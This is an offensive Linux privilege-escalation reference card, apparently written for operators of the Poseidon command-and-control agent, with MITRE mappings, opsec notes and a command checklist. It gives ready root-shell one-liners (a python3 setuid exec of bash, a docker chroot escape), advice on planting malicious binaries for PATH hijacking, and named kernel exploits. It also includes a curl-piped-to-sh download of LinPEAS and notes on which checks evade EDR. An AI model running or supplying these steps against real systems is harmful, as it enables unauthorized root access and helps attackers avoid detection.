---
name: Linux Privilege Escalation Techniques
category: privilege-escalation
subcategories: [linux-privesc, sudo-abuse, suid-abuse, cron-abuse, writable-path]
tradecraft_tags: [linux, privesc, sudo, suid, cron, writable-path, kernel-exploit, poseidon]
mitre_attack:
  - id: T1548.003
    name: Abuse Elevation Control Mechanism — Sudo and Sudo Caching
  - id: T1574.006
    name: Hijack Execution Flow — Dynamic Linker Hijacking
source:
  url: https://github.com/carlospolop/PEASS-ng
  license: Unknown
  maintained: true
binary_type: none
binary_filename: ""
supported_os: [linux, macos]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  Linux privilege escalation generates limited telemetry by default. Auditd (if configured)
  logs sudo invocations, setuid program execution, and file writes. Most Linux servers
  don't have comprehensive auditd rules. SIEM integration (Wazuh, Elastic) captures
  some events. Kernel exploits may generate unusual kernel messages in dmesg/syslog.
usage_examples:
  - description: Check sudo privileges (no-password sudo commands)
    args: "sudo -l"
  - description: Find SUID binaries
    args: "find / -perm -4000 -type f 2>/dev/null"
  - description: Find SGID binaries
    args: "find / -perm -2000 -type f 2>/dev/null"
  - description: List cron jobs (all users if readable)
    args: "cat /etc/crontab; ls -la /etc/cron.d/; ls -la /var/spool/cron/"
  - description: Find world-writable directories in PATH
    args: "echo $PATH | tr ':' '\\n' | xargs -I {} find {} -writable 2>/dev/null"
  - description: Find capabilities-enabled binaries
    args: "getcap -r / 2>/dev/null"
  - description: LinPEAS automated enumeration
    args: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
opsec_notes: |
  Linux privesc enumeration is largely passive (read operations). Auditd with comprehensive
  rules is the primary detection mechanism — most servers have limited auditd coverage.
  LinPEAS generates significant filesystem read traffic and subprocess spawning, which
  is detectable by EDR-capable Linux products (CrowdStrike Falcon, SentinelOne Linux).
  Manual targeted checks (sudo -l, find SUID) are quieter.
gotchas: |
  This is a TECHNIQUE REFERENCE, not a single tool. Use Poseidon's shell command to
  execute these checks. LinPEAS is the automated alternative but is more detectable.
  Key Linux privesc vectors in 2026:
  - Sudo misconfiguration (GTFOBins for sudo binaries)
  - SUID binaries with GTFOBins entries
  - Writable cron job files
  - Docker group membership (escape to host)
  - Writable service files (systemd units)
  - Path hijacking for SUID binaries calling unqualified commands
related_ttps: [linpeas, poseidon]
alternatives: [linpeas, linenum, linux-exploit-suggester]
common_args: {}
last_updated: 2026-05-29
---

# Linux Privilege Escalation Techniques

A reference for Linux privilege escalation checks via Poseidon's shell commands.
Unlike Windows (where dedicated .NET tools exist), Linux privesc is primarily done
via built-in commands and knowledge of common misconfiguration patterns.

## Priority Checklist

### 1. Sudo Misconfiguration (highest value, very common)

```bash
sudo -l  # List commands current user can run as root

# GTFOBins lookup: if any of these are in sudo list, instant root:
# vim, nano, less, more, python, python3, perl, ruby, bash, sh, find,
# nmap (older), awk, tee, dd, cat, cp, mv, chmod, chown, env, ftp,
# wget, curl, git, svn, tar, unzip, zip, rsync
```

### 2. SUID/SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
```
Check any non-standard SUID binaries against GTFOBins (https://gtfobins.github.io/).

### 3. Linux Capabilities

```bash
getcap -r / 2>/dev/null
# High-risk capabilities: cap_setuid, cap_net_raw, cap_sys_admin, cap_sys_ptrace
# python3 with cap_setuid = instant root: python3 -c "import os; os.setuid(0); os.execv('/bin/bash', ['/bin/bash'])"
```

### 4. Writable Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /var/spool/cron/crontabs/
# If a cron job runs a script you can write to, or calls a binary in a writable PATH
```

### 5. Docker Group Membership

```bash
id | grep docker
# If in docker group: instant root via docker run -v /:/mnt --rm -it alpine chroot /mnt sh
groups
```

### 6. Writable PATH Hijacking

```bash
echo $PATH
# Find cron jobs or SUID programs that call relative-path commands:
strings /path/to/suid_binary | grep -v '/' | sort -u
# If any match common commands, create a malicious version in writable PATH dir
```

### 7. Kernel Exploits

```bash
uname -a    # Kernel version
uname -r    # Kernel release
# Check https://www.exploit-db.com for known exploits
# DirtyCow (CVE-2016-5195): affects < 4.8.3 (outdated but still seen)
# PwnKit (CVE-2021-4034): polkit local privesc (affects Ubuntu, RHEL, Fedora)
# DirtyPipe (CVE-2022-0847): kernel 5.8-5.16.11
```

### 8. Writeable Service/Unit Files

```bash
find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
# Writable unit file → modify ExecStart → systemctl restart <service> (if restartable)
```

### 9. World-Writable Files in Root's PATH

```bash
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type f 2>/dev/null
```

## Automated Alternatives

| Tool | Method | Notes |
|------|--------|-------|
| LinPEAS | curl | Comprehensive but noisy |
| LinEnum | curl/upload | Lighter than LinPEAS |
| linux-exploit-suggester | upload | Kernel exploit suggestions only |
| GTFOBins | Web reference | Look up specific binaries |

## Poseidon Workflow

```
# Via Poseidon shell commands:
shell: sudo -l
shell: find / -perm -4000 -type f 2>/dev/null | head -50
shell: getcap -r / 2>/dev/null
shell: id; groups
shell: cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null
```
